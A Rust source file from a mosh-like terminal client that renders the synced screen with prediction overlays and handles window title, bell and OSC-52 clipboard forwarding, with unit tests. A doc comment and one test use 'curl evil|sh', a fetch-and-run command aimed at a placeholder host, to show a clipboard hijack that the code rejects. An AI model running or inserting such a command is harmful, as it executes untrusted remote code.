//! Painting the synchronized `vt100` screen (plus prediction overlays and a status line)
//! onto the local terminal, emitting escape sequences via **termina**.
//!
//! We render cell-by-cell — rather than just blitting `screen.contents_formatted()` — because
//! the predictor needs to draw speculative cells (underlined) *on top of* the authoritative
//! grid. Style changes are diffed against the previous cell so we emit minimal SGR. Each frame
//! is wrapped in synchronized output (DEC mode 2026) so the terminal shows it atomically
//! (no tearing/flicker on full repaints or resizes).
//!
//! termina has no `queue!`/`execute!` / `Command` layer: every escape is a `Display`-able
//! `Csi`/`Csi::Mode`/`Csi::Sgr` value written into any `io::Write` (here, the termina terminal,
//! which itself impls `io::Write`).

use std::io::{self, Write};

use crate::predict::Overlay;
use crate::terminal::MAXIMUM_CLIPBOARD_SIZE;
use termina::escape::csi::{Csi, Cursor, DecPrivateMode, DecPrivateModeCode, Mode, Sgr};
use termina::style::{ColorSpec, Intensity, RgbColor, Underline};
use termina::OneBased;
use vt100::{Color as VtColor, Screen};

/// Map a vt100 color to a termina color spec.
pub fn to_spec(c: VtColor) -> ColorSpec {
    match c {
        VtColor::Default => ColorSpec::Reset,
        VtColor::Idx(i) => ColorSpec::PaletteIndex(i),
        VtColor::Rgb(r, g, b) => ColorSpec::from(RgbColor::new(r, g, b)),
    }
}

/// `Csi` to move the cursor to a 0-based `(row, col)`.
fn move_to(row: u16, col: u16) -> Csi {
    Csi::Cursor(Cursor::Position {
        line: OneBased::from_zero_based(row),
        col: OneBased::from_zero_based(col),
    })
}

fn set_mode(code: DecPrivateModeCode) -> Csi {
    Csi::Mode(Mode::SetDecPrivateMode(DecPrivateMode::Code(code)))
}
fn reset_mode(code: DecPrivateModeCode) -> Csi {
    Csi::Mode(Mode::ResetDecPrivateMode(DecPrivateMode::Code(code)))
}

/// A compact style fingerprint so we only re-emit SGR when it actually changes.
#[derive(PartialEq, Clone, Copy)]
struct Style {
    fg: VtColor,
    bg: VtColor,
    bold: bool,
    dim: bool,
    italic: bool,
    underline: bool,
    inverse: bool,
}

fn emit_style(out: &mut impl Write, s: Style) -> io::Result<()> {
    // Reset clears everything (incl. colors), then re-apply.
    write!(out, "{}", Csi::Sgr(Sgr::Reset))?;
    if s.bold {
        write!(out, "{}", Csi::Sgr(Sgr::Intensity(Intensity::Bold)))?;
    }
    if s.dim {
        write!(out, "{}", Csi::Sgr(Sgr::Intensity(Intensity::Dim)))?;
    }
    if s.italic {
        write!(out, "{}", Csi::Sgr(Sgr::Italic(true)))?;
    }
    if s.underline {
        write!(out, "{}", Csi::Sgr(Sgr::Underline(Underline::Single)))?;
    }
    if s.inverse {
        write!(out, "{}", Csi::Sgr(Sgr::Reverse(true)))?;
    }
    write!(
        out,
        "{}{}",
        Csi::Sgr(Sgr::Foreground(to_spec(s.fg))),
        Csi::Sgr(Sgr::Background(to_spec(s.bg)))
    )?;
    Ok(())
}

/// Render the authoritative `screen` with prediction `overlay` and an optional `status` line
/// (drawn reverse-video on the last row) to `out`, wrapped in one synchronized-output frame.
pub fn render(
    out: &mut impl Write,
    screen: &Screen,
    overlay: &Overlay,
    status: Option<&str>,
) -> io::Result<()> {
    let (rows, cols) = screen.size();

    // Begin Synchronized Update (atomic frame) and hide the cursor while we paint.
    write!(out, "{}", set_mode(DecPrivateModeCode::SynchronizedOutput))?;
    write!(out, "{}", reset_mode(DecPrivateModeCode::ShowCursor))?;

    let mut cur_style: Option<Style> = None;
    for row in 0..rows {
        write!(out, "{}", move_to(row, 0))?;
        let mut col = 0u16;
        while col < cols {
            let cell = screen.cell(row, col);
            if let Some(c) = cell {
                if c.is_wide_continuation() {
                    col += 1;
                    continue;
                }
            }
            // A prediction wins on glyph/underline for this cell — EXCEPT an "unknown" cell,
            // which only hints: it underlines the real cell rather than overwriting its glyph.
            let pred = overlay.cell(row, col);
            let concrete = pred.filter(|p| !p.unknown); // prediction carrying a real glyph
            let hint_underline = pred.is_some_and(|p| p.unknown && p.underline);

            let style = if let Some(p) = concrete {
                Style {
                    fg: p.fg,
                    bg: p.bg,
                    bold: false,
                    dim: false,
                    italic: false,
                    // mosh flags predictions with underline on high-latency links.
                    underline: p.underline,
                    inverse: false,
                }
            } else if let Some(c) = cell {
                Style {
                    fg: c.fgcolor(),
                    bg: c.bgcolor(),
                    bold: c.bold(),
                    dim: c.dim(),
                    italic: c.italic(),
                    underline: c.underline() || hint_underline,
                    inverse: c.inverse(),
                }
            } else {
                Style {
                    fg: VtColor::Default,
                    bg: VtColor::Default,
                    bold: false,
                    dim: false,
                    italic: false,
                    underline: hint_underline,
                    inverse: false,
                }
            };

            if cur_style != Some(style) {
                emit_style(out, style)?;
                cur_style = Some(style);
            }

            // Borrow a &str per branch — no per-cell String allocation on the hot repaint path
            // (S-04): `contents()` already returns &str and the predicted glyph is borrowed from the
            // overlay, both outliving this write. An empty glyph renders as a blank cell.
            let glyph: &str = if let Some(p) = concrete {
                &p.glyph
            } else if let Some(c) = cell.filter(|c| c.has_contents()) {
                c.contents()
            } else {
                " "
            };
            write!(out, "{}", if glyph.is_empty() { " " } else { glyph })?;
            col += 1;
        }
    }

    write!(out, "{}", Csi::Sgr(Sgr::Reset))?;

    if let Some(st) = status {
        let mut line = format!(" {st} ");
        let max = cols as usize;
        if line.len() > max {
            // Truncate on a UTF-8 char boundary, never mid-scalar. `cols` is the peer-controlled
            // (clamped) screen width, and the status strings contain multi-byte glyphs (em-dash,
            // ellipsis), so a raw `String::truncate(max)` would panic and crash the client (KOH-04).
            let mut end = max;
            while end > 0 && !line.is_char_boundary(end) {
                end -= 1;
            }
            line.truncate(end);
        }
        write!(
            out,
            "{}{}{}{}",
            move_to(rows.saturating_sub(1), 0),
            Csi::Sgr(Sgr::Reverse(true)),
            line,
            Csi::Sgr(Sgr::Reset)
        )?;
    }

    // Place and show the cursor: the predicted cursor wins if present, else the real one.
    let (crow, ccol) = overlay.cursor().unwrap_or_else(|| screen.cursor_position());
    write!(out, "{}", move_to(crow, ccol))?;
    if !screen.hide_cursor() {
        write!(out, "{}", set_mode(DecPrivateModeCode::ShowCursor))?;
    }

    // End Synchronized Update: the terminal now reveals the whole frame at once.
    write!(
        out,
        "{}",
        reset_mode(DecPrivateModeCode::SynchronizedOutput)
    )?;
    out.flush()
}

/// Strip control chars from an OSC string payload so it can't break the sequence we wrap it in.
fn sanitize_osc(t: &str) -> String {
    t.chars().filter(|c| !c.is_control()).collect()
}

/// Whether `s` is a well-formed base64 clipboard payload: non-empty and only the standard base64
/// alphabet (`A–Z a–z 0–9 + / =`). A remote OSC-52 set should be base64; anything else is rejected
/// rather than written verbatim to the user's terminal/clipboard (L-1 hardening).
fn is_base64_payload(s: &str) -> bool {
    !s.is_empty()
        && s.bytes()
            .all(|b| b.is_ascii_alphanumeric() || matches!(b, b'+' | b'/' | b'='))
}

/// The out-of-band window state for one frame.
///
/// What the client mirrors onto the real terminal alongside the cell grid (window title, icon
/// name, clipboard, bell). All sourced from the synced [`crate::terminal::TerminalScreen`].
#[derive(Clone, Copy)]
pub struct WindowState<'a> {
    pub title: &'a str,
    pub icon: &'a str,
    pub clipboard: &'a str,
    pub bell_count: u64,
}

/// Tracks the *out-of-band* terminal state the client mirrors onto the real terminal — window
/// title / icon (OSC 0/1/2), clipboard (OSC 52), the bell, and the input modes (bracketed-paste /
/// mouse / cursor-key) — so each is re-emitted only when it changes. These ride alongside the cell
/// grid but aren't part of it.
#[derive(Default)]
pub struct OutOfBand {
    /// Prepended to the window title (and to the icon when icon == title) so the OS title bar shows
    /// you're in a koh session — mosh's `[mosh] ` prefix (`$MOSH_TITLE_NOPREFIX` to disable).
    /// Empty disables it. Compared cells stay the *raw* title, so change-detection is unaffected.
    title_prefix: String,
    /// Whether remote OSC-52 clipboard writes are honored. **Default OFF** (L-1): a malicious server
    /// could otherwise silently overwrite the user's system clipboard (e.g. swap a copied command
    /// for `curl evil|sh`). Opt in with `--clipboard` / `KOH_CLIPBOARD=1`; even then the payload is
    /// validated as strict base64 within the size cap before it's forwarded.
    clipboard_enabled: bool,
    /// Sticky (mosh's `title_initialized`): until the app sets a title/icon we don't touch the
    /// user's terminal title — and once it has, we DO propagate a later reset to empty.
    title_initialized: bool,
    last_title: String,
    last_icon: String,
    last_clipboard: String,
    last_bell: u64,
    /// Previous frame's screen, kept only to diff its input modes against the current frame.
    prev_screen: Option<Screen>,
}

impl OutOfBand {
    /// An [`OutOfBand`] that prefixes the window title with `title_prefix` (e.g. `"[koh] "`; pass
    /// `""` to disable). All other state starts fresh.
    pub fn with_title_prefix(title_prefix: String) -> Self {
        Self {
            title_prefix,
            ..Self::default()
        }
    }

    /// Enable (or disable) honoring remote OSC-52 clipboard writes (default off). Chainable:
    /// `OutOfBand::with_title_prefix(p).with_clipboard(enabled)`.
    #[must_use]
    pub fn with_clipboard(mut self, enabled: bool) -> Self {
        self.clipboard_enabled = enabled;
        self
    }

    /// Invalidate the tracked out-of-band state so the next [`emit`](Self::emit) re-asserts the
    /// title, clipboard, bell baseline, and input modes from scratch. Used after a suspend/resume
    /// (the terminal left and re-entered raw mode + the alternate screen), where everything the
    /// client had mirrored must be re-emitted. The `title_prefix` is preserved.
    pub fn invalidate(&mut self) {
        let prefix = std::mem::take(&mut self.title_prefix);
        let clipboard_enabled = self.clipboard_enabled;
        *self = Self::with_title_prefix(prefix).with_clipboard(clipboard_enabled);
    }

    /// Emit this frame's title/icon / clipboard / bell / input-mode changes to `out`, updating the
    /// tracked state. Mirrors mosh's `Display::new_frame` out-of-band emission.
    pub fn emit(
        &mut self,
        out: &mut impl Write,
        screen: &Screen,
        win: WindowState<'_>,
    ) -> io::Result<()> {
        self.emit_window_title(out, win.title, win.icon)?;
        // Clipboard (OSC 52): OFF by default (L-1). A remote server must not silently overwrite the
        // user's system clipboard. Only when the user explicitly opted in (`--clipboard` /
        // `KOH_CLIPBOARD=1`) do we forward it — and only a strict-base64 payload within the size cap
        // (the synced value is already capped client-side; we re-check defensively).
        if self.clipboard_enabled && win.clipboard != self.last_clipboard {
            self.last_clipboard = win.clipboard.to_string();
            if !win.clipboard.is_empty()
                && win.clipboard.len() <= MAXIMUM_CLIPBOARD_SIZE
                && is_base64_payload(win.clipboard)
            {
                write!(out, "\x1b]52;c;{}\x07", win.clipboard)?;
            }
        }
        // Bell: ring once when the server's bell count climbs (coalesced if several rang).
        if win.bell_count > self.last_bell {
            out.write_all(b"\x07")?;
            self.last_bell = win.bell_count;
        }
        // Input modes: re-assert bracketed-paste / mouse / cursor-key (diff vs the previous frame).
        let mode_bytes = match &self.prev_screen {
            Some(prev) => screen.input_mode_diff(prev),
            None => screen.input_mode_formatted(),
        };
        if !mode_bytes.is_empty() {
            out.write_all(&mode_bytes)?;
        }
        self.prev_screen = Some(screen.clone());
        Ok(())
    }

    /// Window title + icon (mosh `Display::new_frame`): a combined `]0;` when icon == title, else
    /// `]1;icon` + `]2;title`. Guarded by the sticky title-initialized flag.
    fn emit_window_title(
        &mut self,
        out: &mut impl Write,
        title: &str,
        icon: &str,
    ) -> io::Result<()> {
        if self.title_initialized {
            if title == self.last_title && icon == self.last_icon {
                return Ok(());
            }
        } else {
            if title.is_empty() && icon.is_empty() {
                return Ok(()); // nothing set yet — don't blank the user's terminal title
            }
            self.title_initialized = true;
        }
        self.last_title = title.to_string();
        self.last_icon = icon.to_string();
        // Prefix the title (and the icon only when it equals the title, preserving the
        // combined-vs-split branch) — mosh `Framebuffer::prefix_window_title`. The prefix rides on
        // top of the sanitized raw values; change-detection above used the raw (unprefixed) strings.
        let icon_eq_title = icon == title;
        let t = format!("{}{}", self.title_prefix, sanitize_osc(title));
        let ic = if icon_eq_title {
            format!("{}{}", self.title_prefix, sanitize_osc(icon))
        } else {
            sanitize_osc(icon)
        };
        if ic == t {
            write!(out, "\x1b]0;{t}\x07")
        } else {
            write!(out, "\x1b]1;{ic}\x07\x1b]2;{t}\x07")
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::predict::{DisplayPreference, PredictionEngine};

    fn screen_of(bytes: &[u8]) -> Screen {
        let mut p = vt100::Parser::new(24, 80, 0);
        p.process(bytes);
        p.screen().clone()
    }

    #[test]
    fn renders_authoritative_text_with_escapes() {
        let screen = screen_of(b"hi");
        let mut buf = Vec::new();
        render(&mut buf, &screen, &Overlay::empty(), None).unwrap();
        let s = String::from_utf8_lossy(&buf);
        assert!(s.contains("hi"), "rendered text missing");
        assert!(s.contains('\x1b'), "expected ANSI escape sequences");
    }

    #[test]
    fn render_wraps_frame_in_synchronized_output() {
        let screen = screen_of(b"x");
        let mut buf = Vec::new();
        render(&mut buf, &screen, &Overlay::empty(), None).unwrap();
        let s = String::from_utf8_lossy(&buf);
        assert!(
            s.contains("\x1b[?2026h"),
            "frame must begin synchronized output"
        );
        assert!(
            s.contains("\x1b[?2026l"),
            "frame must end synchronized output"
        );
    }

    /// Build a `WindowState` for tests.
    fn win<'a>(title: &'a str, icon: &'a str, clipboard: &'a str, bell: u64) -> WindowState<'a> {
        WindowState {
            title,
            icon,
            clipboard,
            bell_count: bell,
        }
    }

    #[test]
    fn out_of_band_title_emits_once_and_guards_empty() {
        let mut oob = OutOfBand::default();
        let scr = screen_of(b"");

        // Empty title/icon before the shell sets one: never blank the user's terminal title.
        let mut buf = Vec::new();
        oob.emit(&mut buf, &scr, win("", "", "", 0)).unwrap();
        assert!(
            !String::from_utf8_lossy(&buf).contains("\x1b]"),
            "no OSC for an unset title"
        );

        // A real title (icon == title) is emitted as the combined OSC 0.
        let mut buf = Vec::new();
        oob.emit(&mut buf, &scr, win("vim - file.rs", "vim - file.rs", "", 0))
            .unwrap();
        assert!(String::from_utf8_lossy(&buf).contains("\x1b]0;vim - file.rs\x07"));

        // Unchanged → not re-emitted.
        let mut buf = Vec::new();
        oob.emit(&mut buf, &scr, win("vim - file.rs", "vim - file.rs", "", 0))
            .unwrap();
        assert!(!String::from_utf8_lossy(&buf).contains("\x1b]0;"));

        // Once initialized, a reset to empty IS propagated (mosh's sticky guard).
        let mut buf = Vec::new();
        oob.emit(&mut buf, &scr, win("", "", "", 0)).unwrap();
        assert!(String::from_utf8_lossy(&buf).contains("\x1b]0;\x07"));
    }

    #[test]
    fn out_of_band_splits_icon_and_title() {
        let mut oob = OutOfBand::default();
        let scr = screen_of(b"");
        let mut buf = Vec::new();
        // Distinct icon name + title → ESC]1;<icon> then ESC]2;<title> (mosh).
        oob.emit(&mut buf, &scr, win("the title", "the-icon", "", 0))
            .unwrap();
        let s = String::from_utf8_lossy(&buf);
        assert!(s.contains("\x1b]1;the-icon\x07"), "icon OSC 1, got {s:?}");
        assert!(s.contains("\x1b]2;the title\x07"), "title OSC 2, got {s:?}");
    }

    #[test]
    fn out_of_band_prefixes_title_and_equal_icon() {
        let mut oob = OutOfBand::with_title_prefix("[koh] ".to_string());
        let scr = screen_of(b"");

        // icon == title: the prefix is applied to both, and the combined OSC 0 carries it.
        let mut buf = Vec::new();
        oob.emit(&mut buf, &scr, win("vim", "vim", "", 0)).unwrap();
        assert!(
            String::from_utf8_lossy(&buf).contains("\x1b]0;[koh] vim\x07"),
            "combined title is prefixed, got {:?}",
            String::from_utf8_lossy(&buf)
        );

        // icon != title: only the title (OSC 2) is prefixed; the icon (OSC 1) is left untouched,
        // mirroring mosh's prefix_window_title (which preserves equivalence but doesn't prefix a
        // distinct icon name).
        let mut buf = Vec::new();
        oob.emit(&mut buf, &scr, win("the title", "the-icon", "", 0))
            .unwrap();
        let s = String::from_utf8_lossy(&buf);
        assert!(
            s.contains("\x1b]1;the-icon\x07"),
            "distinct icon unprefixed, got {s:?}"
        );
        assert!(
            s.contains("\x1b]2;[koh] the title\x07"),
            "title prefixed, got {s:?}"
        );
    }

    #[test]
    fn out_of_band_default_has_no_title_prefix() {
        // The Default constructor (used by tests and the no-prefix opt-out) adds nothing.
        let mut oob = OutOfBand::default();
        let mut buf = Vec::new();
        oob.emit(&mut buf, &screen_of(b""), win("vim", "vim", "", 0))
            .unwrap();
        assert!(String::from_utf8_lossy(&buf).contains("\x1b]0;vim\x07"));
    }

    #[test]
    fn out_of_band_clipboard_off_by_default_emits_nothing() {
        // L-1: a default OutOfBand must NOT forward a server-set clipboard — no OSC 52 reaches the
        // terminal even though the clipboard changed (the user never opted in).
        let mut oob = OutOfBand::default();
        let scr = screen_of(b"");
        let mut buf = Vec::new();
        oob.emit(&mut buf, &scr, win("", "", "aGVsbG8=", 0))
            .unwrap();
        assert!(
            !String::from_utf8_lossy(&buf).contains("\x1b]52;"),
            "no OSC-52 without explicit opt-in, got {:?}",
            String::from_utf8_lossy(&buf)
        );
    }

    #[test]
    fn out_of_band_forwards_clipboard_when_opted_in() {
        let mut oob = OutOfBand::default().with_clipboard(true);
        let scr = screen_of(b"");
        let mut buf = Vec::new();
        oob.emit(&mut buf, &scr, win("", "", "aGVsbG8=", 0))
            .unwrap();
        assert!(
            String::from_utf8_lossy(&buf).contains("\x1b]52;c;aGVsbG8=\x07"),
            "clipboard OSC 52 forwarded when opted in"
        );
        // Same clipboard again → not re-emitted.
        let mut buf = Vec::new();
        oob.emit(&mut buf, &scr, win("", "", "aGVsbG8=", 0))
            .unwrap();
        assert!(!String::from_utf8_lossy(&buf).contains("\x1b]52;"));
    }

    #[test]
    fn out_of_band_rejects_non_base64_clipboard_even_when_opted_in() {
        // Even with the opt-in on, a non-base64 payload (e.g. raw shell injection) is dropped, not
        // written verbatim to the terminal.
        let mut oob = OutOfBand::default().with_clipboard(true);
        let scr = screen_of(b"");
        let mut buf = Vec::new();
        oob.emit(&mut buf, &scr, win("", "", "curl evil|sh", 0))
            .unwrap();
        assert!(
            !String::from_utf8_lossy(&buf).contains("\x1b]52;"),
            "a non-base64 clipboard payload is rejected, got {:?}",
            String::from_utf8_lossy(&buf)
        );
    }

    #[test]
    fn out_of_band_rings_bell_on_increase_only() {
        let mut oob = OutOfBand::default();
        let scr = screen_of(b"");
        // Establish the mode baseline (so later emits don't also carry mode bytes).
        let mut warm = Vec::new();
        oob.emit(&mut warm, &scr, win("", "", "", 0)).unwrap();

        // No increase → no bell.
        let mut buf = Vec::new();
        oob.emit(&mut buf, &scr, win("", "", "", 0)).unwrap();
        assert!(buf.is_empty(), "no bell when the count is unchanged");

        // Count climbs (possibly by more than one) → exactly one bell.
        let mut buf = Vec::new();
        oob.emit(&mut buf, &scr, win("", "", "", 3)).unwrap();
        assert_eq!(buf, b"\x07", "one bell on an increase, even if it jumped");
    }

    #[test]
    fn out_of_band_reasserts_input_modes_on_change() {
        let mut oob = OutOfBand::default();
        // Baseline frame in default modes.
        let mut warm = Vec::new();
        oob.emit(&mut warm, &screen_of(b""), win("", "", "", 0))
            .unwrap();

        // The remote turns on bracketed paste + mouse reporting → re-asserted to the real terminal.
        let modes = screen_of(b"\x1b[?2004h\x1b[?1000h");
        let mut buf = Vec::new();
        oob.emit(&mut buf, &modes, win("", "", "", 0)).unwrap();
        let s = String::from_utf8_lossy(&buf);
        assert!(s.contains("2004"), "bracketed-paste re-asserted, got {s:?}");
        assert!(s.contains("1000"), "mouse reporting re-asserted, got {s:?}");
    }

    #[test]
    fn renders_status_line() {
        let screen = screen_of(b"");
        let mut buf = Vec::new();
        render(&mut buf, &screen, &Overlay::empty(), Some("link down")).unwrap();
        assert!(String::from_utf8_lossy(&buf).contains("link down"));
    }

    #[test]
    fn status_line_truncation_is_panic_free_across_all_widths() {
        // KOH-04: the peer-controlled (clamped) screen width must never make the multi-byte status
        // line panic via a mid-UTF-8 `String::truncate`. Sweep every width in [MIN_DIM, MAX_DIM]
        // with the real link-down banner (em-dash U+2014 + ellipsis U+2026, whose bytes straddle
        // widths 18/19/30/31) and assert render() never panics.
        use crate::terminal::{MAX_DIM, MIN_DIM};
        let status = "[koh] link down — resuming… 5s";
        for cols in MIN_DIM..=MAX_DIM {
            let screen = {
                let mut p = vt100::Parser::new(MIN_DIM, cols, 0);
                p.process(b"x");
                p.screen().clone()
            };
            let mut buf = Vec::new();
            render(&mut buf, &screen, &Overlay::empty(), Some(status))
                .expect("render must not error or panic at any width");
        }
    }

    #[test]
    fn renders_prediction_overlay_glyph() {
        // A predicted glyph (once the server has confirmed it echoes) must appear in the output.
        // Predictions are epoch-gated and hidden until confirmed, so confirm a first keystroke,
        // then a subsequent typed char becomes visible and should render.
        let mut pe = PredictionEngine::new(DisplayPreference::Always);
        pe.set_local_frame_sent(0);
        let blank = screen_of(b"");
        pe.new_user_byte(0, b'a', &blank); // hidden (epoch 1, unconfirmed)
        let echoed = screen_of(b"a");
        pe.set_local_frame_late_acked(1);
        pe.cull(50, &echoed); // confirms -> confirmed_epoch = 1

        pe.set_local_frame_sent(1);
        pe.new_user_byte(60, b'Z', &echoed); // now visible at (0,1)
        let overlay = pe.overlay(&echoed);
        assert!(
            !overlay.is_empty(),
            "confirmed prediction should be visible"
        );

        let mut buf = Vec::new();
        render(&mut buf, &echoed, &overlay, None).unwrap();
        assert!(
            String::from_utf8_lossy(&buf).contains('Z'),
            "predicted glyph not rendered"
        );
    }
}
